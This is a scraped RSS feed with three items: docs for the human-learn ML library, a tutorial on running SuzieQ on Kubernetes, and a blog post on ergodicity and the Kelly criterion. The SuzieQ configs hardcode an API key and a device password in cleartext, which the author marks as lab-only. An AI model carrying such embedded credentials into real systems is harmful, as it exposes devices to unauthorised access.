<h3 id="getting-started">Getting Started<a href="#getting-started" title="Permanent link">¶</a></h3>
<p>To help you get started we've written some helpful getting started guides.</p>
<ol>
<li><a href="https://koaning.github.io/human-learn/guide/function-classifier/function-classifier.html">Functions as a Model</a></li>
<li><a href="https://koaning.github.io/human-learn/guide/function-preprocess/function-preprocessing.html">Human Preprocessing</a></li>
<li><a href="https://koaning.github.io/human-learn/guide/drawing-classifier/drawing.html">Drawing as a Model</a></li>
<li><a href="https://koaning.github.io/human-learn/guide/finding-outliers/outliers.html">Outliers and Comfort</a></li>
<li><a href="https://koaning.github.io/human-learn/guide/function-classifier/function-classifier.html">Drawing Features</a></li>
</ol>
<p>You can also check out the API documentation <a href="https://koaning.github.io/human-learn/api/classification.html">here</a>.</p>
<h2 id="features">Features<a href="#features" title="Permanent link">¶</a></h2>
<p>This library hosts a couple of models that you can play with.</p>
<h3 id="interactive-drawings">Interactive Drawings<a href="#interactive-drawings" title="Permanent link">¶</a></h3>
<p>This tool allows you to draw over your datasets. These drawings can later
be converted to models or to preprocessing tools.</p>
<p><img alt="" src="https://koaning.github.io/human-learn/draw-gif.gif"></p>
<h3 id="classification-models">Classification Models<a href="#classification-models" title="Permanent link">¶</a></h3>
<h4 id="functionclassifier">FunctionClassifier<a href="#functionclassifier" title="Permanent link">¶</a></h4>
<p>This allows you to define a function that can make classification predictions. It's
constructed in such a way that you can use the arguments of the function as a parameter
that you can benchmark in a grid-search.</p>
<h4 id="interactiveclassifier">InteractiveClassifier<a href="#interactiveclassifier" title="Permanent link">¶</a></h4>
<p>This allows you to draw decision boundaries in interactive charts to create a
model. You can create charts interactively in the notebook and export it as a
scikit-learn compatible model.</p>
<h3 id="regression-models">Regression Models<a href="#regression-models" title="Permanent link">¶</a></h3>
<h4 id="functionregressor">FunctionRegressor<a href="#functionregressor" title="Permanent link">¶</a></h4>
<p>This allows you to define a function that can make regression predictions. It's
constructed in such a way that you can use the arguments of the function as a parameter
that you can benchmark in a grid-search.</p>
<h3 id="outlier-detection-models">Outlier Detection Models<a href="#outlier-detection-models" title="Permanent link">¶</a></h3>
<h4 id="functionoutlierdetector">FunctionOutlierDetector<a href="#functionoutlierdetector" title="Permanent link">¶</a></h4>
<p>This allows you to define a function that can declare outliers. It's constructed in
such a way that you can use the arguments of the function as a parameter that you
can benchmark in a grid-search.</p>
<h4 id="interactiveoutlierdetector">InteractiveOutlierDetector<a href="#interactiveoutlierdetector" title="Permanent link">¶</a></h4>
<p>This allows you to draw decision boundaries in interactive charts to create a
model. If a point falls outside of these boundaries we might be able to declare
it an outlier. There's a threshold parameter for how strict you might want to be.</p>
<h3 id="preprocessing-models">Preprocessing Models<a href="#preprocessing-models" title="Permanent link">¶</a></h3>
<h4 id="pipetransformer">PipeTransformer<a href="#pipetransformer" title="Permanent link">¶</a></h4>
<p>This allows you to define a function that can make handle preprocessing. It's
constructed in such a way that you can use the arguments of the function as a parameter
that you can benchmark in a grid-search. This is especially powerful in combination
with the pandas <code>.pipe</code> method. If you're unfamiliar with this amazing feature, you
may appreciate <a href="https://calmcode.io/pandas-pipe/introduction.html">this tutorial</a>.</p>
<h4 id="interactivepreprocessor">InteractivePreprocessor<a href="#interactivepreprocessor" title="Permanent link">¶</a></h4>
<p>This allows you to draw features that you'd like to add to your dataset or
your machine learning pipeline. You can use it via <code>tfm.fit(df).transform(df)</code> and
<code>df.pipe(tfm)</code>.</p>
<h3 id="datasets">Datasets<a href="#datasets" title="Permanent link">¶</a></h3>
<h4 id="titanic">Titanic<a href="#titanic" title="Permanent link">¶</a></h4>
<p>This library hosts the popular titanic survivor dataset for demo purposes. The goal of
this dataset is to predict who might have survived the titanic disaster.</p>
<h4 id="fish">Fish<a href="#fish" title="Permanent link">¶</a></h4>
<p>The fish market dataset is also hosted in this library. The goal of this dataset
is to predict the weight of fish. However, it can also be turned into a classification problem
by predicting the species.</p>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </div></div>]]>
            </description>
            <link>https://koaning.github.io/human-learn/#interactive-drawings</link>
            <guid isPermaLink="false">hacker-news-small-sites-25966706</guid>
            <pubDate>Sat, 30 Jan 2021 06:13:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Network Observability with Suzieq on Kubernetes]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25966613">thread link</a>) | @teleforce
<br/>
January 29, 2021 | https://www.hyposcaler.com/posts/suzieq-on-k8s/ | <a href="https://web.archive.org/web/*/https://www.hyposcaler.com/posts/suzieq-on-k8s/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <h2 id="why">Why?</h2>
<p>I recently discovered <a href="https://github.com/netenglabs/suzieq">SuzieQ</a>, it’s a wonderful new tool that Dinesh Dutt and Justin Pietsch have been working on.  For more details on what exactly SuzieQ is see the intro <a href="https://elegantnetwork.github.io/posts/Suzieq/">post</a> by Justin &amp; Dinesh.</p>
<p>As to why put it on k8s?  I don’t know k8s well, it’s just the compute hammer I have to work with in my current environment. That said, I do happen to like k8s as a hammer, and luckily suzieq seems to do a pretty good job of being a k8s nail.</p>
<p>This document started as a weekend project to walk thru getting suzieq on k8s in my private lab for no other reason than it seemed fun.  The more I worked with it on k8s the more I liked the idea, and the more I liked the idea of deploying in my real physical lab.</p>
<p>The environment I have for my network management software is a managed k8s environment.  It’s what I have access to for “managed compute”. It also has access to the management plane of my network gear.  This means if I want to go to the real lab or prod, I have a vested interest in being able to deploy suzieq on k8s.</p>
<p>The idea of using a HTTP based API for accessing much of the info that suzieq collects appeals to me.  I like the idea of connecting to a suzieQ deployment versus running the pollers directly on my workstation.  Playing with that as a puzzle problem appeals to me as much as suzieQ as a product appeals to me as a network engineer.    I like the idea of the journey and the destination as it were.</p>

<p>Mostly me, this started as notes for me to reference later on how to do it, but I don’t imagine I’m gonna be the first person that thinks of running SuzieQ on k8s.</p>
<h2 id="the-basic-target">The basic target</h2>
<p>For just playing around in the lab I want to start out with something that sticks as close as I can to the docker example that is in the suzieq repository.  In that example there are two containers; one for sq-poller, and another for the suzieq-cli.   I’m going to replicate the same in a k8s deployment set with replicas set to 1.</p>
<p>My goal will be to run run 3 containers in a single k8s pod, one container for each of the following processes that make up suzieq.</p>
<ol>
<li><code>sq-poller</code></li>
<li><code>sq-rest-server.py</code></li>
<li><code>suzieq-gui</code></li>
</ol>
<p>For simplicity I will use the same docker container as the docker demo</p>
<p>What’s needed</p>
<ul>
<li>For persisting data I will use a k8s <a href="https://kubernetes.io/docs/concepts/storage/persistent-volumes/">persistent volume</a></li>
<li>For managing config I will store configs as a k8s <a href="https://kubernetes.io/docs/concepts/configuration/configmap/">config map</a></li>
<li>For storing secrets like certificates, keys or passwords I will use k8s <a href="https://kubernetes.io/docs/concepts/configuration/secret/">secrets</a></li>
<li>To expose the Rest API and GUI outside of the cluster, I will use a k8s <a href="https://kubernetes.io/docs/concepts/services-networking/service/">service</a></li>
<li>To tie it all together I will use a k8s <a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/">deployment</a></li>
</ul>
<p>The assorted yml files referenced in this post as well as the content of this post is available on <a href="https://github.com/hyposcaler/suzieq-on-k8s/">github</a></p>
<h2 id="generating-the-certificates">Generating the certificates</h2>
<p>I need a cert for the demo deployment, a self signed cert will do.  In production the certificate would be signed by my internal CA.  I can use openssl to generate the certificate with the following command</p>
<p><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></p>
<p>Below is an example of using openssl in interactive mode to generate a selfsigned certificate.</p>
<pre><code>[dev-suzieq]$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
Generating a 4096 bit RSA private key
....................++
........................................++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [XX]:US
State or Province Name (full name) []: Bespin
Locality Name (eg, city) [Default City]:Cloud City    
Organization Name (eg, company) [Default Company Ltd]:Hyperbolic Hyposcaler Industries
Organizational Unit Name (eg, section) []:network
Common Name (eg, your name or your server's hostname) []:suzieq.network.hyposcaler.net
Email Address []:devnull@hyposcaler.io
</code></pre><p>After running the command and filling in the details it should produce two files: <code>key.pem</code> and <code>cert.pem</code>.</p>
<p>Once I have the certs I’ll store them as secrets on the k8s server.  For the lab I’ll just use kubectl for that.  The following command will create the secret from the cert.pem and key.pem created by openssl earlier.</p>
<pre><code>kubectl create secret tls suzieq-tls-secret \
  --cert=cert.pem \
  --key=key.pem
</code></pre><p>Regardless of how the cert is created, a k8s TLS secret is typically the interface for the deployment to access it.  There are a variety of methods to manage secrets securely on k8, they generally tend to have use of k8s secrets in common as the delivery method for exposing the secrets to containers.</p>
<p>In practice while I may not be doing exactly what I would in prod, the way I’m doing it creates a good approximation of what suzieq would see in prodution in my environment.</p>
<p>Once I have created the k8s TLS secret, the key and cert files from openssl can be deleted.</p>
<h2 id="create-a-namespace">create a namespace</h2>
<p>To keep things neat I will create a namesspace, all the remaining k8s objects I create will be created within this namespace</p>
<p>I can use <code>kubectl create namespace suzieq</code></p>
<pre><code>[dev-suzieq]$ kubectl create namespace suzieq
namespace/suzieq created
[dev-suzieq]$
</code></pre><p>verify it is in place with <code>kubectl get namespace suzieq</code></p>
<pre><code>[dev-suzieq]$ kubectl get namespace suzieq
NAME     STATUS   AGE
suzieq   Active   3s
[dev-suzieq]$
</code></pre><h2 id="generating-the-configmaps">Generating the configMaps</h2>
<p>There are two config related files that suzieQ uses</p>
<p>The first is <code>suzieq-cfg.yml</code>. It is the main suzieq config file.  The suzieq config holds pointers to the assorted paths for files it uses.  It also holds references to the the API_KEY used by the Rest server for auth.  Lastly it also has pointers to the locations of the TLS certificates.</p>
<p>The following is a typical <code>suzieq-cfg.yml</code> file</p>
<div><pre><code data-lang="yaml"><span>data-directory</span>: <span>/suzieq/parquet</span>
<span>service-directory</span>: <span>/suzieq/config</span>
<span>schema-directory</span>: <span>/suzieq/config/schema</span>
<span>temp-directory</span>: <span>/tmp/</span>
<span># kafka-servers: localhost:9093</span>
<span>logging-level</span>: <span>WARNING</span>
<span>period</span>: <span>15</span>
<span>API_KEY</span>: <span>496157e6e869ef7f3d6ecb24a6f6d847b224ee4f</span>
<span>rest_certfile</span>: <span>/suzieq/tls/cert.pem</span>
<span>rest_keyfile</span>: <span>/suzieq/tls/key.pem</span>
</code></pre></div><p>In fact it’s the default config, with one small change:  I have added a subdirectory under /suzieq/ to hold the certificates.  I like having an empty directory to mount the TLS secrets into.</p>
<p>The other config we need to keep track of is the inventory.  The inventory is also a yaml based file.</p>
<p>I use this as my standin for inventory</p>
<div><pre><code data-lang="yaml">- <span>namespace</span>: <span>eos</span>
  <span>hosts</span>:
    - <span>url</span>: <span>https://neteng:arista123@10.255.0.10 devtype=eos</span>
</code></pre></div><p>Note I’m storing the passwords in the clear here, for a small private virtual lab that gets spun up and down as needed, I’m happy to do that.  This is not something I would want to do in production.  It also happens that in my specific production instance I need a way to support password based auth.   I would ultimately prefer to store the credential as a k8s secret, and pass that secret into the container via an environment variable, or file.</p>
<p>If I were using SSH keys, I would use a k8s ssh key secret and mount them into the suzieq directory under a keys subfolder, similar to what I do do with TLS.  You specify a path to the key in the suzieq poller config, so it would work well for k8s SSH secret.</p>
<p>For the suzieq-cfg.yml a config map fits the bill nicely.  For lab purposes or small scale deployments, a configMap should work for inventory as well, there’s an upper limit of 1MB, but that’s a lot of config.</p>
<p>Either way I mash these up into the same yaml file named configmap.yml.</p>
<p>The resulting file looks like the following.</p>
<div><pre><code data-lang="yaml">---
<span>apiVersion</span>: <span>v1</span>
<span>kind</span>: <span>ConfigMap</span>
<span>metadata</span>:
  <span>name</span>: <span>suzieq-inventory</span>
  <span>namespace</span>: <span>suzieq</span>
<span>data</span>:
 <span>inventory.yml</span>: <span>|
</span><span>    - namespace: eos
</span><span>      hosts:
</span><span>        - url: https://neteng:arista123@10.255.0.10 devtype=eos</span>
---
<span>apiVersion</span>: <span>v1</span>
<span>kind</span>: <span>ConfigMap</span>
<span>metadata</span>:
  <span>name</span>: <span>suzieq-config</span>
  <span>namespace</span>: <span>suzieq</span>
<span>data</span>:
  <span>suzieq-cfg.yml</span>: <span>|
</span><span>    data-directory: /suzieq/parquet
</span><span>    service-directory: /suzieq/config
</span><span>    schema-directory: /suzieq/config/schema
</span><span>    temp-directory: /tmp/
</span><span>    # kafka-servers: localhost:9093
</span><span>    logging-level: WARNING
</span><span>    period: 15
</span><span>    API_KEY: 496157e6e869ef7f3d6ecb24a6f6d847b224ee4f
</span><span>    rest_certfile: /suzieq/tls/tls.crt
</span><span>    rest_keyfile: /suzieq/tls/tls.key
</span></code></pre></div><p>then use kubectl to create the two configmaps on the k8s cluster by running <code>kubectl create -f samples/k8s/configmap.yml</code> from the root of the repo</p>
<p>once created kubectl can be used to to verify they exist:</p>
<pre><code data-lang="cli">[dev-suzieq]$ kubectl -n suzieq describe configmap
NAME               DATA   AGE
suzieq-config      1      25h
suzieq-inventory   2      20h
[dev-suzieq]$
</code></pre><p>After they are created, they can later be edited in place, or overwritten with new config maps.</p>
<h2 id="persistent-volumes">Persistent Volumes</h2>
<p>For the persistent volume, create a file named pvc.yml with the following contents</p>
<div><pre><code data-lang="yaml">---
<span>apiVersion</span>: <span>v1</span>
<span>kind</span>: <span>PersistentVolumeClaim</span>
<span>metadata</span>:
  <span>namespace</span>: <span>suzieq</span>
  <span>name</span>: <span>parquet-pv-claim</span>
<span>spec</span>:
  <span>accessModes</span>:
    - <span>ReadWriteOnce     # will only have 1 pod so read </span>
  <span>resources</span>:            <span># write once for now is fine</span>
    <span>requests</span>:
      <span>storage</span>: <span>5Gi      # 5Gi completely arbitrary value. </span>
</code></pre></div><p>deploy it to the cluster via <code>kubectl create -f samples/k8s/pvc.yml</code>, this will cause the cluster to set aside 5Gi of storage, it’s lifecycle is not tied to the pod.  The pods are ephemeral, the storage can persist across the life of many pods.</p>
<h2 id="the-deployment">the deployment</h2>
<p>with the volumes, secrets, and storage lined up on the k8s cluster, all that remains is the deployment for the pod.</p>
<p>use a k8s <a href="https://kubernetes.io/docs/concepts/workloads/controllers/deployment/">deployment</a> to deploy suzieq.</p>
<p>The documentation does a pretty good job of explaining what a deployment is. Refer to the k8s deployment documentation for more details.</p>
<p>This deployment will ensure that there are always 3 containers running.  The containers only really have 3 differences between them</p>
<ul>
<li>the command executed at start</li>
<li>the volumes they have access to</li>
<li>the resource memory and cpu requests/limits</li>
</ul>
<h3 id="command-executed">command executed</h3>
<p>There 3 containers, one for each of the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.hyposcaler.com/posts/suzieq-on-k8s/">https://www.hyposcaler.com/posts/suzieq-on-k8s/</a></em></p>]]>
            </description>
            <link>https://www.hyposcaler.com/posts/suzieq-on-k8s/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25966613</guid>
            <pubDate>Sat, 30 Jan 2021 05:54:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ergodicity: The most over-looked assumption (neurabites.com)]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25966194">thread link</a>) | @mprime1
<br/>
January 29, 2021 | https://neurabites.com/ergodicity/ | <a href="https://web.archive.org/web/*/https://neurabites.com/ergodicity/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				
<p><span><b>TL;DR</b></span></p>
<ul>
<li>Here’s the game. Flip a coin. You win 50% of your net worth on heads, but only lose 40% on tails. How many times should you play?</li>
<li>Despite the apparently favourable odds, chances are you’ll eventually go bust. Why?</li>
<li>This is because of the path-dependency of time. Because of the fallacious ergodicity assumption.</li>
<li>Ergodicity is when the ensemble-average equals the time-average. For instance, when 10 people doing something once produces the same result as 1 person doing it 10 times.</li>
<li>Essentially, ergodicity lets you conveniently convert time into a space equivalent.&nbsp;</li>
<li>For non-ergodic systems, the aggregate’s performance is a misleading indicator of individual performance. As a whole, the average might look like it’s winning, despite majority of individuals losing.</li>
<li>The Kelly criterion allows us to optimize our bet size to maximize long-term winnings.</li>
<li>While most financial systems are non-ergodic, the foundations of classical economic theory rests on fallacious ergodic assumptions – from DCF valuations to the way we measure GDP growth.</li>
<li>Putting these ergodicity concepts to practical use, I’ve now increased the weighting I give to non-recoverable risks.</li>
</ul>
<hr>
<p><span><b>Being less of a sucker</b></span></p>
<p>The way we interpret data profoundly shapes the way we understand the world.</p>
<p>Mistakes have a compounding effect. The stakes are high and real.</p>
<figure id="attachment_2251" aria-describedby="caption-attachment-2251"><img data-attachment-id="2251" data-permalink="https://neurabites.com/ergodicity/time-spent-exponential-graphs/" data-orig-file="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?fit=828%2C624&amp;ssl=1" data-orig-size="828,624" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="time spent exponential graphs" data-image-description="" data-medium-file="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?fit=300%2C226&amp;ssl=1" data-large-file="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?fit=800%2C603&amp;ssl=1" loading="lazy" src="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?resize=400%2C301&amp;ssl=1" alt="" width="400" height="301" srcset="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?w=828&amp;ssl=1 828w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?resize=300%2C226&amp;ssl=1 300w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?resize=768%2C579&amp;ssl=1 768w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?resize=796%2C600&amp;ssl=1 796w" sizes="(max-width: 400px) 100vw, 400px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?w=828&amp;ssl=1 828w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?resize=300%2C226&amp;ssl=1 300w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?resize=768%2C579&amp;ssl=1 768w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?resize=796%2C600&amp;ssl=1 796w" data-lazy-src="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/time-spent-exponential-graphs.jpg?resize=400%2C301&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption id="caption-attachment-2251">“Gradually and then suddenly.” Hopefully we’re better at interpreting exponentials now. The importance of using logarithmic axes etc.</figcaption></figure>
<p>You’re probably familiar with these common mistakes in interpreting data:</p>
<ul>
<li>Looking at <strong>average</strong> when you should be looking at <strong>median.</strong> <span>e.g. for personal income distributions</span></li>
<li>Looking at <strong>aggregates</strong> rather than more <strong>granular</strong> <strong>segments.</strong> <span>e.g. sales increased 10% this year, but all of it came from a new business line, while the core businesses remained flat</span></li>
<li>Mistaking <strong>non-linear</strong> outcomes to be <strong>linear</strong> ones <span>e.g. cumulative number of COVID-19 cases</span></li>
</ul>
<p>But you’re probably less familiar with the <strong>ergodicity assumption</strong>.</p>
<p>Surprisingly prevalent in systems, but generally poorly understood and barely known.</p>
<p>Much like Black Swans, <a href="https://neurabites.com/antifragility/" target="_blank" rel="noopener noreferrer">antifragility, non-linearity, and optionality</a>, it’s another concept that Nassim Taleb has raised his voice on. But this one has received far less attention than others.</p>
<p>And hence I write this post in parts:</p>
<ol>
<li><strong>Going bust despite favourable odds</strong>: A gambling example, ergodic vs non-ergodic, and the Kelly criterion</li>
<li><strong>Ergodocity economics: </strong>Prevalence and dangers of the ergodic assumption in modern portfolio theory, DCF models, and GDP</li>
<li><strong>Living in bets: </strong>H<span>ow I’m personally applying ergodicity concepts to life</span></li>
</ol>

<hr>
<h3><span><strong>1. Going bust despite favourable odds</strong></span></h3>
<p><span><b>1.1. Definition</b></span></p>
<blockquote>
<p>A process is said to be <strong>ergodic</strong>&nbsp;if the <strong>ensemble</strong>-average and <strong>time</strong>-average is <strong>equivalent</strong>.</p>
</blockquote>
<p>A more formal definition from Ole Peters from his <a href="https://www.nature.com/articles/s41567-019-0732-0" target="_blank" rel="noopener noreferrer">Dec-19 Nature journal article</a>:</p>
<blockquote>
<p>The ergodic hypothesis is a key analytical device of equilibrium statistical mechanics. It underlies the assumption that the <strong>time</strong> <strong>average</strong> and the <strong>expectation</strong> <strong>value</strong> of an observable are the same. Where it is valid, dynamical descriptions can often be replaced with much simpler probabilistic ones — time is essentially eliminated from the models.</p>
</blockquote>
<p>A mouthful right? Let’s park the definition here for now, and take baby steps with a more digestible example.</p>

<p><span><b>1.2. Rigged coin flip game</b></span></p>
<p>Flip a coin. If heads, your net wealth is <strong>increased by 50%</strong>. If tails, your net wealth is <strong>decreased by 40%</strong>.</p>
<p>Would you play? If so, how many times?</p>
<p>At first glance it seems like the game is rigged in your favour. We expect an equal number of heads and tails in the long run. Given you are paid more from each head than you are penalised for on each tail, you should just play as many times as possible right? Besides, even if you end up on a losing streak, you don’t ever lose all your money, you only lose 40% of whatever you were on. You can win it back with the favourable payoffs. Right?</p>
<p>Well, here’s a simulation of what could happen if you played 50 times.</p>
<figure id="attachment_1941" aria-describedby="caption-attachment-1941"><img data-attachment-id="1941" data-permalink="https://neurabites.com/ergodicity/coinflip1/" data-orig-file="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?fit=1045%2C728&amp;ssl=1" data-orig-size="1045,728" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="coinflip1" data-image-description="" data-medium-file="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?fit=300%2C209&amp;ssl=1" data-large-file="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?fit=800%2C557&amp;ssl=1" loading="lazy" src="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=500%2C348&amp;ssl=1" alt="" width="500" height="348" srcset="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=1024%2C713&amp;ssl=1 1024w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=300%2C209&amp;ssl=1 300w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=768%2C535&amp;ssl=1 768w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=861%2C600&amp;ssl=1 861w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=960%2C669&amp;ssl=1 960w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?w=1045&amp;ssl=1 1045w" sizes="(max-width: 500px) 100vw, 500px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=1024%2C713&amp;ssl=1 1024w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=300%2C209&amp;ssl=1 300w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=768%2C535&amp;ssl=1 768w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=861%2C600&amp;ssl=1 861w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=960%2C669&amp;ssl=1 960w, https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?w=1045&amp;ssl=1 1045w" data-lazy-src="https://i0.wp.com/neurabites.com/wp-content/uploads/2020/04/coinflip1.png?resize=500%2C348&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption id="caption-attachment-1941"><a href="https://ergodicityeconomics.com/lecture-notes/" target="_blank" rel="noopener noreferrer">Ergodicity Economics Lecture Notes, Ole Peters</a></figcaption></figure>
<ul>
<li>Horizontal axis is time.</li>
<li>Vertical axis is net worth, a function of time.</li>
<li>N=1 means we’re looking at the outcome for 1 individual.</li>
</ul>
<p>There doesn’t seem to be a trend here. We were expecting an upward gradient given the favourable odds. But we end up at a loss. Strange. Maybe this guy was unlucky?</p>
<p>Let’s extend the simulation for this one individual into 1,000 rounds.</p>
<figure id="attachment_2271" aria-describedby="caption-attachment-2271"><img data-attachment-id="2271" data-permalink="https://neurabites.com/ergodicity/coinflip4/" data-orig-file="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip4.png?fit=786%2C546&amp;ssl=1" data-orig-size="786,546" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="coinflip4" data-image-description="" data-medium-file="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip4.png?fit=300%2C208&amp;ssl=1" data-large-file="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip4.png?fit=786%2C546&amp;ssl=1" loading="lazy" src="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip4.png?resize=500%2C347&amp;ssl=1" alt="" width="500" height="347" srcset="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip4.png?w=786&amp;ssl=1 786w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip4.png?resize=300%2C208&amp;ssl=1 300w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip4.png?resize=768%2C533&amp;ssl=1 768w" sizes="(max-width: 500px) 100vw, 500px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip4.png?w=786&amp;ssl=1 786w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip4.png?resize=300%2C208&amp;ssl=1 300w, https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip4.png?resize=768%2C533&amp;ssl=1 768w" data-lazy-src="https://i1.wp.com/neurabites.com/wp-content/uploads/2020/05/coinflip4.png?resize=500%2C347&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption id="caption-attachment-2271"><a href="https://ergodicityeconomics.com/lecture-notes/" target="_blank" rel="noopener noreferrer">Ergodicity Economics Lecture Notes, Ole Peters</a></figcaption></figure>
<p>Looks like they’re stuck at zero. This is surprisingly given the favourable odds. We expected the math to offset the unlucky first 50 rounds. Is this guy just really unlucky?&nbsp;</p>
<p>Well here’s the same chart as above but with a logarithmic axis.&nbsp;</p>
